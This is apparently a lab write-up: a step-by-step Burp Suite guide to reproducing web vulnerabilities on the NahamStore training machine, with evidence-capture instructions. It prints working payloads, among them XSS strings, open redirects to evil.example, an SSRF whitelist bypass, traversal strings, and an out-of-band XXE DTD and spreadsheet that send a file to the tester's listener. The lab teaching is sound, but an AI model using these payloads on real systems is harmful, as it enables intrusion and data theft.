# Manual reproduction guide (Burp Suite)

A complete, click-by-click procedure for reproducing all eight confirmed findings and capturing your own evidence.

Every finding uses the same shape: **Goal → Prerequisites → Steps (with what you should see at each one) → What to screenshot → Traps.** If a step does not produce the "You should now see" line, stop and fix it before moving on. Do not push forward on a broken step and hope the next one recovers.

Read **Section 2** before you touch the target. The marks are in the evidence, not the finding, and the evidence standard is easy to get wrong even when the bug is right.

---

## Contents

1. Setup
2. Evidence standards - read before you start
3. How to capture a request (the one skill everything else needs)
4. Findings 1-10
5. Traps that cost the most time
6. Troubleshooting Burp
7. Before you submit

---

## 1. Setup

### 1.1 Install and launch Burp

1. Open Burp Suite Community.
2. The first launch shows a licence screen. Scroll to the very bottom and click **I Accept**.
3. On the project screen leave **Temporary project in memory** selected and click **Next**.
4. On the configuration screen leave **Use Burp defaults** selected and click **Start Burp**.

A red banner about the Community edition is normal. Dismiss it.

If Burp refuses to start or dies immediately, see section 6 - it needs Java 21 and macOS Gatekeeper interferes with the bundled runtime.

### 1.2 What you need before starting

- The NahamStore machine **deployed**, with its current IP written down
- A terminal for the hosts file, and a second terminal for finding 9
- About two hours, uninterrupted

Rushing this is what produces the evidence problems you are trying to avoid.

### 1.3 Map the hosts file

In Terminal:

```bash
sudo nano /etc/hosts
```

Add these four lines, replacing `MACHINE_IP` with the real address:

```
MACHINE_IP   nahamstore.thm
MACHINE_IP   shop.nahamstore.thm
MACHINE_IP   marketing.nahamstore.thm
MACHINE_IP   stock.nahamstore.thm
```

Save with `Ctrl+O`, `Enter`, then leave with `Ctrl+X`. Flush the resolver cache:

```bash
sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder
```

**The IP changes on every redeploy.** Redo this each time and delete the old lines first, or your router answers with a 502 and you lose an hour to it.

Verify before continuing:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://nahamstore.thm/
```

`200` means you are ready. `502` or `000` means the hosts entry or the VPN is wrong - fix it now, not later.

### 1.4 Turn intercept off

Go to **Proxy → Intercept**. The button must read **"Intercept is off"**.

If it reads "Intercept is on", every request waits for you and you will spend the next twenty minutes convinced the application is broken.

### 1.5 Open the Burp browser

**Proxy → Intercept → click "Open browser".**

That is a dedicated Chromium instance already pointed at Burp's proxy. Always use it - never your daily browser, which is not proxied and will produce an empty history.

All targets are plain HTTP, so the Burp CA certificate does not matter here. Skip it.

Confirm the browser is actually proxied: load `http://nahamstore.thm/`, then look at **Proxy → HTTP history**. The request must appear. If history stays empty, the browser is not proxied - reopen it from inside Burp, not from the Dock.

### 1.6 Build your own test state

Both IDOR findings need two accounts with their own records. Do this once, properly, and write the ids down.

**Account A**

1. Open `http://nahamstore.thm/register`, register with any email, and log in.
2. Go to **Account → Address Book**, fill the form, submit.
3. Note the address id: add any product to the basket and open `/basket`. The address button form carries `address_id=<id>`. That number is what you need.
4. Catch that `POST /basket` request in history now - you reuse it in finding 6.
5. Choose the address, then pay using card number `1234123412341234`. Every other test number is rejected with "Invalid Card Number"; this is the server's own placeholder.
6. Note the order id from the confirmation page. Open `/returns`, submit a return against that order, and note the redirect `/returns/<id>?auth=<hash>` - that is your baseline record for finding 7.
7. **Log out.**

**Account B**

Repeat steps 1-7 with a different email. Record B's address id, order id and return id separately from A's.

Put all six numbers on paper. Mixing them up mid-flow is the single most common way to lose a baseline.

### 1.7 Where your session cookie lives

Several findings need a logged-in session. Burp carries the cookie automatically as long as you are logged in **in the Burp browser**, so normally you do nothing.

If you ever need it by hand, open any captured authenticated request and copy the whole `Cookie:` header - it holds `session=` and `token=`.

---

## 2. Evidence standards - read before you start

Every finding needs **one** screenshot containing all of:

- [ ] The **full request** - method, full path, parameter name, and every header you added
- [ ] The **response** - status line, plus the part of the body that proves the impact
- [ ] Cropped tight to the request and response panes. No desktop, no other tabs, no clock, no menu bar

For findings 6 and 7 the shot must contain **two** requests: your own record first as the baseline, then the other account's. A single request proves nothing about access control.

### How to take the screenshot

1. Press `Cmd+Shift+4` and drag a region across **both** panes.
2. Include the request line at the top and the proof line at the bottom.
3. Release - it saves to the Desktop.
4. Rename it to `finding-N-short-name.png`.

Do not use `Cmd+Shift+3`. That captures the entire screen, which is exactly what the brief tells you not to paste.

### The response line each shot must contain

| Finding | Must be visible in the response |
|---|---|
| 1, 2 | The payload sitting unescaped in the JavaScript string / inside `<title>` |
| 3, 4 | `HTTP/1.1 302` and the `Location: //evil.example` line |
| 5 | `HTTP/1.1 302` accepted, with the foreign `Origin` visible in the request |
| 6 | Both addresses as rendered in the basket, baseline first |
| 7 | Both `Order Number:` lines, baseline first |
| 8 | `<title>Marketing Manager - Login</title>` |
| 9 | Your listener output with the `?d=` callback and the decoded flag |

If the proof line is not in frame, retake the shot. A cropped-out proof is the same as no evidence.

---

## 3. How to capture a request

Every procedure below begins with "capture the request". This is the exact method.

### 3.1 For a GET

1. Perform the action in the Burp browser so the request happens.
2. Open **Proxy → HTTP history**.
3. Click the **Filter** bar and type part of the path, for example `/search`, to find the row.
4. Click the row once to select it.
5. **Right-click → Send to Repeater.**
6. Switch to the **Repeater** tab at the top of the window. A new numbered tab holds your request.

### 3.2 For a POST

Forms are easy to miss in history, so hold them instead:

1. **Proxy → Intercept** - click to turn intercept **on**.
2. Perform the action in the browser. The request is held and the browser still spins. That is correct.
3. **Right-click the held request → Send to Repeater.**
4. Click **Forward** so the browser finishes, or **Drop** if you do not care.
5. Turn intercept **off** again.

### 3.3 Working in Repeater

- The request pane is on the left, response on the right.
- **Send** is the top-left button.
- **Repeater menu → Update Content-Length** must be **ticked**. That is what lets you edit a POST body without fixing the length by hand.
- Edit the request, click **Send**, then read the response.

Burp will not accept a paste into Repeater when no tab exists. If the pane only says "To get started, send a request to Repeater", you skipped 3.1 or 3.2.

---

## 4. Findings

### Finding 1 - Reflected XSS in the search query

**Severity:** High. **OWASP:** A03:2021 Injection, CWE-79.

**Goal:** make the search term execute as JavaScript.

**Prerequisite:** none. No login needed.

**Steps**

1. In the Burp browser, load `http://nahamstore.thm/search?q=test`.
2. Capture the `GET /search?q=test` request per section 3.1.
3. In the Repeater request pane find `q=test` and replace `test` so the request line reads:

```
GET /search?q=';alert('XSS-PROOF');// HTTP/1.1
```

4. Click **Send**.
5. Scroll the **response** pane to the inline script near the bottom of the page. You should now see:

```html
var search = '';alert('XSS-PROOF');//';
```

The quote closed the JavaScript string and the code sits outside it. Nothing was encoded.

6. If you get a 404, you broke the path - check you replaced only the `q` value.

**What to screenshot:** the request line at the top and the `var search` line with the `$.get` line beneath it in the response.

**Optional second shot:** paste `http://nahamstore.thm/search?q=';alert('XSS-PROOF');//` into the Burp browser and capture the alert dialog. If the dialog will not appear in screenshots on your machine, use the Repeater shot alone and say so in the report. Do not fake it.

**Traps:** using `&` instead of `;` after the alert; dropping the trailing `//` so the rest of the line is not commented out; letting the editor word-wrap and split the request line.

---

### Finding 2 - Reflected XSS in the product name

**Severity:** High. **OWASP:** A03:2021 Injection, CWE-79.

**Goal:** break out of the `<title>` element with the `name` parameter.

**Prerequisite:** none.

**Steps**

1. Load `http://nahamstore.thm/product?id=1`.
2. Capture the `GET /product` request.
3. Replace the `name` value so the request line reads:

```
GET /product?id=1&name=</title><script>alert(1)</script> HTTP/1.1
```

4. **Send**.
5. In the response, inside `<head>`, you should now see:

```html
<title>NahamStore - </title><script>alert(1)</script></title>
```

A `<script>` inside `<title>` will not run on its own, which is why the closing `</title>` comes first. The breakout is the whole point.

**What to screenshot:** the request line and that `<title>` line in the response.

**Traps:** some editors escape `<` and `>` on paste - confirm they survived in the request line before sending.

---

### Finding 3 - Open redirect on login

**Severity:** Medium. **OWASP:** A01:2021 Broken Access Control, CWE-601.

**Goal:** make the login endpoint 302 to an off-site host.

**Prerequisite:** logged out, and a valid credential pair.

**Steps**

1. Log out in the Burp browser.
2. Turn intercept **on** (**Proxy → Intercept**).
3. Submit the login form with valid credentials.
4. When `POST /login` is held, right-click it → **Send to Repeater**, then click **Forward**.
5. Turn intercept **off**.
6. In Repeater, change the request line to:

```
POST /login?redirect_url=//evil.example HTTP/1.1
```

7. Leave the body (`login_email=...&login_password=...`) exactly as captured.
8. **Send**. You should now see:

```
HTTP/1.1 302 Found
Location: //evil.example
```

9. `Location` sits a few lines below the status line. Scroll if you must, but get it in frame.

**What to screenshot:** the request line and the 302 with its `Location` header.

**Traps:** a protocol-relative value (`//host`) is enough - no scheme needed. If you get a 302 to `/` instead, the `redirect_url` was dropped; confirm you kept the `?` and did not URL-encode the slashes.

---

### Finding 4 - Open redirect on the address book

**Severity:** Medium. **OWASP:** A01:2021 Broken Access Control, CWE-601.

**Goal:** the same flaw on a second endpoint.

**Prerequisite:** logged in as account A.

**Steps**

1. Go to **Account → Address Book**.
2. Turn intercept **on**, fill and submit the form.
3. Send the held `POST /account/addressbook` to Repeater, click **Forward**, then intercept **off**.
4. Change the request line to:

```
POST /account/addressbook?redirect_url=//evil.example HTTP/1.1
```

5. **Send**. You should see the same `302` and `Location: //evil.example`.

**What to screenshot:** as finding 3.

**Traps:** this endpoint needs the session cookie. A 302 to `/login` means your session dropped - log back in and recapture.

---

### Finding 5 - CSRF: no token, no Origin check

**Severity:** Medium. **OWASP:** A01:2021 Broken Access Control, CWE-352.

**Goal:** show a state-changing form carries no anti-CSRF token and accepts a foreign origin.

**Prerequisite:** logged in as account A, with one of A's order ids to raise a return against.

**Steps**

1. Open `http://nahamstore.thm/returns` and fill the form.
2. Turn intercept **on**, submit, send the held `POST /returns` to Repeater, **Forward**, then intercept **off**.
3. **Read the request body.** There is no `csrf`, no `token`, no nonce field. That absence is half the finding, so the body must be in frame.
4. Add two headers by hand, directly under the existing `Content-Type` header:

```
Origin: https://evil.example
Referer: https://evil.example/page
```

5. **Send**. It is accepted - `302` to `/returns/<id>?auth=...`. Neither header was validated.

**What to screenshot:** the request with the body visible (showing no token) plus your foreign `Origin`, and the `302` response.

**Traps:** this form is `multipart/form-data`. Do not touch the `boundary=` value in the Content-Type header - only add the two new headers. Replacing the body with urlencoded will fail.

---

### Finding 6 - IDOR on shipping addresses

**Severity:** High. **OWASP:** A01:2021 Broken Access Control, CWE-639.

**Goal:** read account B's shipping address while logged in as A.

**Prerequisite:** both accounts created, both address ids noted, an item in A's basket, A logged in.

**Steps**

1. Open `/basket` with an item in it.
2. Capture the `POST /basket` carrying `address_id=<A's id>`.
3. **Send it unchanged.** The response renders A's own name and address. **This is the baseline - screenshot it now, before editing anything.**
4. Open **Repeater → Duplicate tab** so you hold a second copy of the same request.
5. In the second tab, change `address_id=<A's id>` to `address_id=<B's id>`.
6. **Send.** You should now see B's name, street, city and postcode instead.

**You should now see:** two different names and addresses from the same endpoint, differing only by the id.

**What to screenshot:** both tabs' requests and both rendered addresses in one image.

**Traps:** shooting only the B request, so the marker cannot tell it is not yours. Losing the basket between tabs - if the response says "Please choose an address", re-add an item and recapture.

---

### Finding 7 - IDOR on returns, with a weak token

**Severity:** Medium. **OWASP:** A01:2021 Broken Access Control, CWE-639.

**Goal:** show the `auth` guard is nothing but `md5` of the id.

**Prerequisite:** A's return id, B's return id, A logged in.

**Steps**

1. Hash both ids in Terminal:

```bash
echo -n 1 | md5
```

Replace `1` with each id, and keep both outputs.

2. Capture `GET /returns/<A's id>?auth=<hash of A's id>` and **Send**. `200`, A's return. Baseline shot.
3. Duplicate the tab. Change the path to B's return id and the `auth` value to the hash of B's id.
4. **Send.** `200`, and B's `Order Number` appears.

**You should now see:** both order numbers, each reached with only a recomputed hash.

**What to screenshot:** both requests and both `Order Number:` lines.

**Traps:** hashing the wrong id, or leaving A's hash against B's id - that returns 404 and looks like the bug is absent. Use `echo -n` so no newline is hashed.

---

### Finding 8 - SSRF into the internal admin API

**Severity:** High. **OWASP:** A10:2021 Server-Side Request Forgery, CWE-918.

**Goal:** reach the internal admin interface on port 8000 through the shop.

**Prerequisite:** the machine IP. Not logged in.

**Steps**

1. Confirm the internal service exists first: load `http://<MACHINE_IP>:8000/robots.txt` in the Burp browser. You should see `Disallow: /admin`. Nothing on the public site links to it - that is the point.
2. Load any product page, press **Check Stock**, and capture `POST /stockcheck` with intercept on. Send to Repeater, **Forward**, intercept **off**.
3. **Send** it unchanged first. `server=stock.nahamstore.thm` returns JSON. That is your baseline.
4. The whitelist is only a substring check for `.nahamstore.thm`. Abuse it with userinfo syntax - change the `server` value to:

```
stock.nahamstore.thm@127.0.0.1
```

5. **Send.** You get the shop's own 404 page, proving the host actually changed.
6. `127.0.0.1:8000` comes back empty because port 8000 is a separate container. Use the machine IP, and append `?x=` to truncate the `/product/1` the application adds:

```
stock.nahamstore.thm@<MACHINE_IP>:8000/admin/login?x=
```

7. **Send.** You should now get the internal login page - `<title>Marketing Manager - Login</title>` and a `Marketing Manager Login` heading.

**What to screenshot:** the request with the full `server` value and the response title/heading.

**Traps:** putting `http://` in front of the value fails the whitelist - pass the bare value. Omitting `?x=` gives a 404 because the app appends its own path. `127.0.0.1` on port 8000 returns empty.

---

### Finding 9 - Blind XXE in the timesheet upload

**Severity:** High. **OWASP:** A05:2021 Security Misconfiguration, CWE-611.

**Goal:** make the parser read `/flag.txt` and send it to you.

**Prerequisite:** your VPN IP (`ipconfig getifaddr utun3` - use whichever `utun` holds your THM address) and a dedicated terminal.

The parser never echoes, so this has to be out of band.

**Step 1 - start a listener** (leave it running):

```bash
mkdir -p ~/xxe && cd ~/xxe
python3 -m http.server 8081
```

Use **8081**. Port 8080 is Burp's proxy and will collide.

**Step 2 - write the DTD** to `~/xxe/dtd.xml`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR_VPN_IP>:8081/leak?d=%file;'>">
%eval;
%exfil;
```

Base64 is used so newlines in the file cannot break the callback URL.

**Step 3 - build the weaponised spreadsheet**

```bash
cd ~/xxe
python3 -c "import openpyxl; wb=openpyxl.Workbook(); wb.save('base.xlsx')"
unzip -q base.xlsx -d build
```

Open `build/xl/workbook.xml` and insert this line directly under the `<?xml ... ?>` declaration:

```xml
<!DOCTYPE workbook SYSTEM "http://<YOUR_VPN_IP>:8081/dtd.xml">
```

Rezip:

```bash
cd build && zip -qr ../evil.xlsx . && cd ..
```

**The DOCTYPE only takes effect in `xl/workbook.xml`.** In `sharedStrings.xml`, `sheet1.xml` or `[Content_Types].xml` it is silently ignored - you will get a successful upload and no callback.

**Step 4 - upload**

1. Log in and open `http://nahamstore.thm/staff`.
2. Turn intercept **on**, select `evil.xlsx`, submit.
3. The held request must carry this content type, or you get `XLSX files only!`:

```
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
```

4. Right-click → **Send to Repeater**, **Forward**, intercept **off**.
5. **Send** in Repeater. The response is `200` with "uploaded successfully".

**Step 5 - collect**

Your listener terminal prints within seconds:

```
GET /leak?d=<base64> HTTP/1.0
```

Decode it:

```bash
echo '<base64>' | base64 -d
```

That yields `{d6b22cb3e37bef32d800105b11107d8f}`.

**What to screenshot:** the Repeater request (multipart headers and the `filename=` line) with the listener output and the decoded flag beside it - two windows in one image.

**Traps:** wrong content type; DOCTYPE in the wrong file; listener left on 8080; killing the listener so the callback has nowhere to land.

Repeater cannot attach a file. Either send from the browser form and screenshot the captured request in **HTTP history**, or use `curl -F` from the terminal. Both are honest - just say which you used.

---

### Finding 10 - LFI (attempted, not confirmed)

Documenting a failure honestly scores better than silence, and this one has a clean technical reason worth stating.

**Steps**

1. Confirm the endpoint reads at all: `GET /product/picture/?file=<a hash from a product image>` returns a JPEG.
2. `GET /product/picture/?file=nope.txt` returns `File does not exist`.
3. Submit `file=` bare and you get `file parameter missing` - confirming the parameter name.
4. In Repeater work through the escapes: `/lfi/flag.txt`, `../../../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2f`, `..%2f`, double-encoded `%252f`, absolute `/etc/passwd`, `php://filter/convert.base64-encode/resource=/etc/passwd`, and a trailing `%00`.
5. All return `File does not exist`. Decisively, `file=../<known hash>.jpg` still resolves - so the value is being run through `basename()` and traversal never escapes the image directory.

**What to screenshot:** two or three attempts side by side.

Then state in the report that it was tested and not confirmed, and that `basename()` is the reason.

---

## 5. Traps that cost the most time

| Trap | Consequence |
|---|---|
| Intercept left on | Everything hangs and history looks empty |
| Stale hosts entry | Router 502s that look like a broken target |
| Screenshot taken before the baseline | Access-control finding scores nothing |
| No `Content-Type` on the XXE upload | `XLSX files only!`, callback never fires |
| XXE listener on port 8080 | Collides with Burp's proxy |
| `http://` in the SSRF `server` value | Rejected by the whitelist |
| `127.0.0.1` for port 8000 | Empty response, wrong container |
| Editing a body with `Update Content-Length` off | Malformed request, 400s |
| Pasting into an empty Repeater | Nothing happens - no tab to paste into |
| `Cmd+Shift+3` screenshots | Full desktop, which the brief rejects |
| Hash of the wrong id in finding 7 | 404, looks like the bug is missing |

---

## 6. Troubleshooting Burp

**History stays empty.** The browser is not proxied. Reopen it from **Proxy → Intercept → Open browser**.

**Everything hangs.** Intercept is on. Turn it off.

**400 Bad Request after editing.** `Update Content-Length` is off. Repeater menu, tick it.

**"Target is not responding".** Stale hosts entry or the VPN dropped. Redo section 1.3.

**Repeater will not accept a paste.** No tab open. Send something from history first.

**Burp will not start, or dies within seconds.** It needs Java 21 or newer, and macOS Gatekeeper kills the app's bundled runtime. Install `openjdk@21` and launch Burp from that path:

```bash
/opt/homebrew/opt/openjdk@21/bin/java -jar "/Applications/Burp Suite.app/Contents/Resources/app/burpsuite.jar"
```

**The alert dialog never appears in screenshots.** Known on some macOS setups. Use the Repeater shot alone and note it.

---

## 7. Before you submit

- [ ] Eight findings captured, each with request **and** response visible
- [ ] Both IDOR shots show the baseline first, then the other account, in one image
- [ ] Nothing cropped so tight the parameter or status line is cut
- [ ] No full-desktop shots
- [ ] Files named `finding-N-...`
- [ ] Finding 10 written up as attempted and not confirmed, with the `basename()` reasoning
- [ ] Every shot re-checked against section 2

When your shots are in, swap them into `Presentation_and_Findings.md`, rebuild the deck, and keep only the tool you actually used in the tooling line so the report and the evidence agree.
